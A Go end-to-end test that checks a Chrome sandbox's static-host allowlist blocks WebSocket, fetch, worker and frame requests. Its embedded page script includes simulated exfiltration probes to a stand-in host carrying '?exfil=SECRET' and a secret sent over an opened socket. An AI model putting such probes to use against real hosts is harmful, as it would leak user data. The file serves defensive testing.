//go:build e2e && chrome && linux

package browser_test

import (
	"context"
	"crypto/x509"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/netip"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/FlorianRuen/facto/internal/browser"
	"github.com/FlorianRuen/facto/internal/browser/staticfetch"
	"github.com/FlorianRuen/facto/internal/connector"
	"github.com/FlorianRuen/facto/internal/httpx"
)

// Real-Chrome checks of the path-scoped static allowlist (SEC-J2-1, ADR
// 0008 "Static allowlist"). The static host stays unresolvable in Chrome;
// facto downloads allowed files through a pinned client and fulfills them.
// So a WebSocket to the static host, which Fetch never sees, cannot
// connect on any path, while a crossorigin module script and a fetch under
// the prefix still load (control: the page must work).

const (
	staticHost   = "static.supplier.example"
	staticPrefix = "/app/"
)

var staticEntries = []string{"https://" + staticHost + staticPrefix}

// staticPage loads a crossorigin module script and fetches under the
// prefix (controls), then probes the static host: WebSockets on and off
// the prefix, from the page and from a dedicated worker, a fetch off the
// prefix and a frame under it. Once every probe settled it adds
// <p id="done" class="k-v …">.
const staticPage = `<script type="module" crossorigin src="https://%[1]s/app/mod.js"></script>
<script>
const want = ["module", "fetchin", "fetchout", "wsin", "wsout", "wsother", "workerws", "frame"];
const out = {};
function done(k, v) {
  if (k in out) return;
  out[k] = v;
  if (want.every(w => w in out)) {
    const p = document.createElement("p");
    p.id = "done"; p.textContent = "done";
    p.className = Object.entries(out).map(([a, b]) => a + "-" + b).join(" ");
    document.body.appendChild(p);
  }
}
window.moduleRan = () => done("module", "ran");
setTimeout(() => done("module", "missing"), 15000);
function probe(k, url) {
  let ws;
  try { ws = new WebSocket(url); } catch (e) { done(k, "refused"); return; }
  ws.onopen = () => { done(k, "open"); ws.send("SECRET-typed-value"); ws.close(); };
  ws.onerror = () => done(k, "failed");
  ws.onclose = () => done(k, "failed");
}
probe("wsin", "wss://%[1]s/app/ws");
probe("wsout", "wss://%[1]s/ws-out?exfil=SECRET");
probe("wsother", "wss://%[1]s/other-bucket/ws?exfil=SECRET");
fetch("https://%[1]s/app/data.txt").then(r => r.text()).then(t => done("fetchin", t === "static-ok" ? "ok" : "bad"), () => done("fetchin", "blocked"));
fetch("https://%[1]s/outside.js?exfil=SECRET").then(() => done("fetchout", "ok"), () => done("fetchout", "blocked"));
const w = new Worker("/static-worker.js");
w.onmessage = (e) => done("workerws", e.data);
const fr = document.createElement("iframe");
fr.src = "https://%[1]s/app/frame.html";
fr.onload = () => setTimeout(() => done("frame", "settled"), 500);
document.body.appendChild(fr);
setTimeout(() => done("frame", "settled"), 5000);
</script>`

const staticWorker = `
let ws;
try { ws = new WebSocket("wss://%[1]s/app/worker-ws?exfil=SECRET"); } catch (e) { postMessage("refused"); }
if (ws) { ws.onopen = () => postMessage("open"); ws.onerror = () => postMessage("failed"); ws.onclose = () => postMessage("failed"); }
`

// staticClientsFor returns StaticClients reaching site through the e2e
// pinned loopback client, trusting the site's CA only.
func staticClientsFor(t *testing.T, site *fakeSite) browser.StaticClients {
	t.Helper()
	chain := site.tls.TLS.Certificates[0].Certificate
	ca, err := x509.ParseCertificate(chain[len(chain)-1])
	if err != nil {
		t.Fatal(err)
	}
	roots := x509.NewCertPool()
	roots.AddCert(ca)
	target := netip.AddrPortFrom(netip.AddrFrom4([4]byte{127, 0, 0, 1}), uint16(site.port)) //nolint:gosec // httptest port fits
	return func(host, prefix string) (browser.StaticGet, error) {
		c, err := httpx.NewPinnedLoopback(host, prefix, target, roots, httpx.Options{})
		if err != nil {
			return nil, err
		}
		return staticfetch.FromClient(c), nil
	}
}

// staticStarter is e2eStarter driven by the pool's own release argv: when
// the production --host-resolver-rules make the static host resolvable
// (the SEC-J2-1 regression), the e2e argv maps it to the fake site too, so
// the WebSocket probes below connect and the test fails. Today the
// production rules never name it, and it resolves to nothing.
func staticStarter(site *fakeSite, resolvable *bool) func(r *chromeRig) browser.Starter {
	return func(r *chromeRig) browser.Starter {
		return func(ctx context.Context, cmd browser.Command) (browser.Process, error) {
			profile, ok := argValue(cmd.Args, "--user-data-dir=")
			if !ok {
				return nil, errors.New("static starter: no --user-data-dir in the pool's argv")
			}
			rules, ok := argValue(cmd.Args, "--host-resolver-rules=")
			if !ok {
				return nil, errors.New("static starter: no --host-resolver-rules in the pool's argv")
			}
			hosts, allowed := []string{siteHost}, slices.Clone(siteDomains)
			if strings.Contains(rules, staticHost) {
				*resolvable = true
				hosts, allowed = append(hosts, staticHost), append(allowed, staticHost)
			}
			args, err := browser.FlagsE2E(browser.Options{
				ProfileDir: profile, AllowedDomains: allowed,
				Visible: !slices.Contains(cmd.Args, headlessFlag), AllowProxy: !slices.Contains(cmd.Args, "--no-proxy-server"),
			}, browser.E2EOverrides{LoopbackHosts: hosts, LoopbackPort: site.port, TestCASPKI: []string{site.caSPKI}})
			if err != nil {
				return nil, fmt.Errorf("static starter: %w", err)
			}
			cmd.Args = args
			p, err := browser.StartPipeProcess(ctx, cmd)
			if err != nil {
				return nil, err
			}
			r.record(p.Pid())
			return p, nil
		}
	}
}

// TestAttack_ChromeStaticHostWebSocketBlocked (SEC-J2-1).
func TestAttack_ChromeStaticHostWebSocketBlocked(t *testing.T) {
	ctx, cancel := context.WithTimeout(t.Context(), e2eTimeout)
	defer cancel()
	site := newFakeSite(t)
	var staticHits []string
	inner := site.tls.Config.Handler
	site.tls.Config.Handler = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if !strings.EqualFold(r.Host, siteHost) && !strings.HasPrefix(strings.ToLower(r.Host), siteHost+":") {
			site.mu.Lock()
			staticHits = append(staticHits, r.Method+" "+r.URL.Path+" upgrade="+r.Header.Get("Upgrade"))
			site.mu.Unlock()
			switch r.URL.Path {
			case "/app/mod.js":
				if o := r.Header.Get("Origin"); o != "" {
					w.Header().Set("Access-Control-Allow-Origin", o)
				}
				w.Header().Set("Content-Type", "text/javascript")
				w.Header().Set("Set-Cookie", "tracker=1; Secure")
				_, _ = io.WriteString(w, "window.moduleRan();")
			case "/app/data.txt":
				w.Header().Set("Access-Control-Allow-Origin", "*")
				w.Header().Set("Content-Type", "text/plain")
				_, _ = io.WriteString(w, "static-ok")
			case "/app/ws", "/app/worker-ws", "/ws-out", "/other-bucket/ws":
				site.upgrade(w, r)
			default:
				w.Header().Set("Content-Type", "text/html")
				_, _ = io.WriteString(w, "<!doctype html><p>static</p>")
			}
			return
		}
		switch r.URL.Path {
		case "/static":
			w.Header().Set("Content-Type", "text/html; charset=utf-8")
			_, _ = io.WriteString(w, "<!doctype html><meta charset=\"utf-8\"><body>"+fmt.Sprintf(staticPage, staticHost)+"</body>")
		case "/static-worker.js":
			w.Header().Set("Content-Type", "text/javascript")
			_, _ = io.WriteString(w, fmt.Sprintf(staticWorker, staticHost))
		default:
			inner.ServeHTTP(w, r)
		}
	})

	r := newChromeRig(t, nil)
	// The rig's pool has no StaticClients: build one with them.
	resolvable := false
	pool, err := browser.NewPool(t.Context(), browser.PoolConfig{
		Host: chromeHost(r.exe, r.home), StateDir: r.state,
		Start: staticStarter(site, &resolvable)(r), StaticClients: staticClientsFor(t, site),
	})
	if err != nil {
		t.Fatalf("NewPool: %v", err)
	}
	t.Cleanup(func() { _ = pool.Close() })
	lb, err := pool.Launch(ctx, connector.LaunchOptions{AllowedDomains: siteDomains, Static: staticEntries})
	if err != nil {
		t.Fatalf("Launch with a static entry: %v", err)
	}
	b, ok := lb.(*browser.PoolBrowser)
	if !ok {
		t.Fatalf("Launch returned %T", lb)
	}
	closeAtCleanup(t, b)
	openSite(ctx, t, b, "/static", "#done")

	want := map[string]string{
		"module": "ran", "fetchin": "ok", // controls: the app still loads
		"fetchout": "blocked",
		"wsin":     "failed", "wsout": "failed", "wsother": "failed", "workerws": "failed",
	}
	for k, v := range want {
		cctx, cc := context.WithTimeout(ctx, 2*time.Second)
		if err := b.WaitVisible(cctx, "#done."+k+"-"+v); err != nil {
			t.Errorf("probe %s: want %s (%v)", k, v, err)
		}
		cc()
	}
	if resolvable {
		t.Errorf("the release --host-resolver-rules name the static host %s", staticHost)
	}
	site.mu.Lock()
	hits := slices.Clone(staticHits)
	site.mu.Unlock()
	for _, h := range hits {
		if strings.Contains(h, "upgrade=websocket") || strings.Contains(strings.ToLower(h), "upgrade=websocket") {
			t.Errorf("a WebSocket handshake reached the static host: %s", h)
		}
		if !strings.HasPrefix(strings.SplitN(h, " ", 3)[1], staticPrefix) {
			t.Errorf("a request off the static prefix reached the static host: %s", h)
		}
		if strings.Contains(h, "/app/frame.html") {
			t.Errorf("a frame document on the static host was fetched: %s", h)
		}
	}
	if !slices.ContainsFunc(hits, func(h string) bool { return strings.HasPrefix(h, "GET /app/mod.js") }) {
		t.Errorf("control: the module script was not downloaded through facto: %v", hits)
	}
	if bh := b.BlockedHosts(); bh[staticHost] == 0 {
		t.Errorf("BlockedHosts = %v, want the off-prefix fetch counted under %s", bh, staticHost)
	}
}
